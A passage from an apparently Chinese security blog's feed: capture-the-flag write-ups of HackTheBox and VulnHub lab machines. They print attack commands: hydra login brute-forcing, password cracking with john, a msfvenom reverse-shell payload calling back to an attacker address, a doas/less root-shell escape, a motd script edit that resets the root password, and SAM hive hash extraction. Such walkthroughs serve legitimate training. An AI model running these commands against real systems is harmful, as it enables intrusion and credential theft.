&lt;h1 id=&#34;发现隐藏信息的图片有路径&#34;&gt;发现隐藏信息的图片，有路径&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;命令：exiftool main.gif
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;根据提示进行爆破hydra-http-爆破&#34;&gt;根据提示进行爆破，hydra http 爆破&lt;/h1&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;p&gt;解释表单参数，“路径:用户名:密码:F=错误返回”&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form &amp;#34;/department/login.php:username=^USER^password=^PASS^:F=Invalid&amp;#34; -t 64
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;抓包看提交参数，这里经过摸索，使用-e n 参数来只爆破用户名&lt;/p&gt;
&lt;p&gt;完整命令如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;hydra -L /usr/share/wordlists/rockyou.txt -e n 192.168.154.129 http-post-form &amp;#34;/kzMb5nVYJw/index.php:key=^USER^:F=invalid&amp;#34; -t 60
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获得账号：elite&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE685e129e46e63fad64e61d8f8010a2a2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;sql注入&#34;&gt;SQL注入&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcbc84a3ac2d9f43525d3ace151bdd022%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;破解hashbase64解码一下&#34;&gt;破解hash，Base64解码一下&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa7afcc6b8b1e2bda6028950386326cd4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;翻查敏感信息&#34;&gt;翻查敏感信息&lt;/h1&gt;
&lt;p&gt;修复文件?&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE98de53f7ca8b73524c3345126a406676%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X002 Arctic</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x002-arctic/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x002-arctic/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf6d72da494f38de5fed08804d34a61c3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE833aee3fd7f537d2c3b8a04e9f154944image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE53d7733878f164ca14703d16760544e1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;端口扫描没有发现什么东西，使用浏览器看看：&lt;/p&gt;
&lt;p&gt;在8500端口发现目录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE41b83d461cb7a5a03146d8fa1eb8d1afimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;多点几个，就可以发现一个登录页面：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2541ac8fbc25bd846fc4973eb39cb6f4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE94bcf131227a9d45707970a4b861a941image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;简单修改一下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE89c15fee79f0f23d1e5d9b727b13a407image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;getshell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE53d6caae5bd8100a6f39643b67ab2aadimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;user.txt&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb942387a31d460081eefbb1455493548image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE218a61c3eda589112c633a28f358c0a6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfb0873c52764bdcd00533bb59327ba5aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;脚本跑一半卡住了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5c4e536796440628e46856af9c8fd32bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;暂且试试这个吧：&lt;/p&gt;
&lt;p&gt;找了很多地方，最后在github找到了这个：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/zcgonvh/MS16-032/releases/tag/Release&#34;&gt;https://github.com/zcgonvh/MS16-032/releases/tag/Release&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEeb78205aafb5cd8aa28bdf152bbbd822image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3bf028759e5e97dc57898d9c1a8f18ceimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEce39594a2e63d6e20c40de5570dba99eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x002 FourAndSix2.01</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x002-fourandsix2.01/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x002-fourandsix2.01/</guid>
      <description>&lt;h1 id=&#34;ip端口扫描&#34;&gt;IP&amp;amp;端口扫描&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo nmap -Pn -sS -p- -sV  192.168.154.130
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE45460ef9fe8d8f4de9fccc017dd36244%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;挂载nfs&#34;&gt;挂载NFS&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo mount -t nfs 192.168.154.130:/home/user/storage ./storage
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;破解解压密码&#34;&gt;破解解压密码&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;7z2john backup.7z &amp;gt; hash3
john -wordlist=/usr/share/wordlists/rockyou.txt hash3
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;发现图片和私钥&#34;&gt;发现图片和私钥&lt;/h1&gt;
&lt;p&gt;图片内没有东西，私钥链接需要密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb78f860910caa1eafc7b0f4a9b55bff5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;破解rsa私钥密码&#34;&gt;破解rsa私钥密码&lt;/h1&gt;
&lt;p&gt;方式与上面一致&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE38b881339b33a84247dd712004ba787e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;SUID提权：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3897cdce7c776f8933a5f679f20638de%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查找命令相关文件：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find / -name *doas* -type f 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfaa371dfa93e8d3cbfb15e92deab123d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;根据提示来看，使用以下命令：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;doas /usr/bin/less /var/log/authlog
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后按V来使用VI编辑器，然后输入：！sh来获得root shell&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1a69288e2eed33e3a2ca48eb14b0a473%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
&lt;p&gt;用doas的高权限运行/usr/bin/less查看/var/log/authlog，然后调用VI编辑器，通过VI编辑器可以获得高权限sh shell。&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X003 Devel</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x003-devel/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x003-devel/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8fa170ba37f4fdeeebab2d8169336c34image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE77147834dff16d0532bf298f0ff45314image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE20d52032feda99b423deb2fa93ae93a2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;ftp匿名登录:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdda843ba7d07b35e6a5190d2007b8a8bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;HTTP配合：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4585ba8026fe26a06f7f20ad79925988image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;生成木马：&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=8889 -f aspx -o cxk.aspx&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE93b9d30a443c1afadfd86c98d81e9888image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa5950510bcf11e167cd7053203227b51image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEda8018e18f77cf2ea0a6ec577ac7757dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;没有任何补丁：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE509e781aa6e38526e096213733c82c83image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;内核提权试试：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE87c9c9a4ef6e7a3b8aa0cf997a4692a3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE310b6501a12cf39328a35d979f49c2eeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;上传32位的nc:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/int0x33/nc.exe/blob/master/nc.exe&#34;&gt;https://github.com/int0x33/nc.exe/blob/master/nc.exe&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc4e3a7d776e726e569ad4208ad021cdeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe3ae08c61484e306d1701a528ecf7c63image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;6988a0c5429f9c38b48a927333d8701a&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6c35dd9d6df83c998958875edb31c3f6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x003 HA Narak</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x003-ha-narak/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x003-ha-narak/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE459cd1832e7352042ce534b82ac463ad%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;目录扫描&#34;&gt;目录扫描&lt;/h1&gt;
&lt;p&gt;这里遇到一个问题，我下意识的认为靶机403没有价值所以没去看，导致错过入口&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc3203e0ab9995b5cca660f80f5b0d39a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h2 id=&#34;字典收集&#34;&gt;字典收集&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cewl 192.168.154.131 -w 1.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE619c86ff1531cc0781cd27b2e6e3bead%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h3 id=&#34;hydry-爆破&#34;&gt;hydry 爆破&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;hydra -L 1.txt -P 1.txt 192.168.154.131 http-get /webdav
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbf08351ca395b8459b80fb7a9c998b8a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里有几个疑问，burp抓包如下：&lt;/p&gt;
&lt;p&gt;看数据包内可能是MD5的加密方式，但是，没发现MD5的加密数据&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE49a8844d9c9cc2515ee4da893fcc56d2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;同时使用wireshark抓包，如下，均未发现MD5密码的痕迹，前端又不让抓JS，有点疑惑hydry是怎么做到的&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe0a283cb172a94c140181163d835e77c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过查阅资料发现HTTP协议身份认证的相关知识，&lt;/p&gt;
&lt;p&gt;上面的例子属于DIGEST 认证(摘要认证），客户端请求时会采用质询码计算生成响应码。最后将响应码返回给接收方进行认证的方式，所以不会存在bas64编码的明文密码。&lt;/p&gt;
&lt;h1 id=&#34;webdav利用&#34;&gt;webdav利用&lt;/h1&gt;
&lt;p&gt;涉及一些新的内容：&lt;/p&gt;
&lt;p&gt;WebDAV服务漏洞利用工具DAVTest，大致看了一下，可以知道html\php文件上传执行成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf59a54686243b2714c291cc8d16fb1ab%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;上传PHP反弹shell脚本：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE75384ebcd019134631c13fdfc3afbc55%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;inferno的user.txt&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4e1a6d67a59956273ba4ab3a4127e0af%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;提权这里遇到的问题挺多的，进行一下记录：&lt;/p&gt;
&lt;p&gt;首先常规的sudo以及SUID均无法提权，所以遇到阻塞，随后，翻查敏感信息，发现了以下内容：&lt;/p&gt;
&lt;p&gt;主要是TIPS.txt和creds.txt，creds.txt为base64加密内容，解密出来为web爆破的密码，尝试过登录，但是没有成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7d95dbff73673ef17704b74ef1a17af1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后续又上传了自动化工具，进行提权，但是都失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE79eef3e89d742333d6bc61066fd732b4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;随后只能看WP了：&lt;/p&gt;
&lt;p&gt;发现问题，信息收集不够全面，没发现/mnt目录下的hell.sh，同时没见过BF编码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE43fcfebea100a18469d8d8d427433a4e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.splitbrain.org/services/ook&#34;&gt;https://www.splitbrain.org/services/ook&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8f88720599b6542d2e61700db9c289ad%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过密码去尝试登录可登录的账户名：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcc47450022e0b62817d866431edce998%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;修改文件达到提权:&lt;/p&gt;
&lt;p&gt;命令为：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd /etc/update-motd.d/
echo &amp;#34;echo &amp;#39;root:d1no&amp;#39; | sudo chpasswd&amp;#34; &amp;gt;&amp;gt; 00-header
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb74a9876258db237271160cbb82611e0%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X004 Bastion</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x004-bastion/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x004-bastion/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE20936b99374514d5e6ce2add517036fbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE78871723166dee836b3bcf80aa89cb7bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0b9f7b952b6c488dadfaf68b6a3b4497image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbd2917511f778e19cf733f1cb967c44cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;smb：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE901e48ea26c5f42847cfbec1c0ac19d4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;挂载到本地：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1084e891b2be7b0ed64a326eaa4ef7d4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE15cd0f823721b338a90296ab512810d7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;打开后，慢慢翻查，没有发现什么有效的东西，但是后面看了一下，最重要的是哪个backup文件夹，里面有两个和其他不一样的文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf62a948c97343673c5df70a32bae460bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;借助GPT，我们可以知道是什么东西，其实是个硬盘，是硬盘就可以看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEddc0d0b86fbc12fe370d2363e0107786image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用guestmount进行挂载：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;安装：
sudo apt-get install libguestfs-tools


使用
sudo guestfish --rw -a 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
run
list-filesystems  ****查看要挂载的文件系统
exit
挂载：
sudo guestmount -a 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd -m /dev/sda1 /mnt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbf560e890ecfa9ba6ade9959b8c2c2a5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE36aa2d778925d3064fa40a5274ca18a7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;sam文件地址：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\WIndows\System32\config\SAM
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;SYSTEM hives地址：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; C:\Windows\System32\config\SYSTEM
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把这两个文件拷贝出来：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb7cb4501d2f43017c75bef6bf5a87669image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;samdump2 读取hash:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa56df4487c87e17799af463c1dc86506image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;john破解ntml hash:&lt;/p&gt;
&lt;p&gt;bureaulampje     (L4mpje)&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE391353a350aa7df977722483227b0e26image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ssh登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb22b71fa3836d077e80b209f723d6598image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x004 Mercury</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x004-mercury/</link>
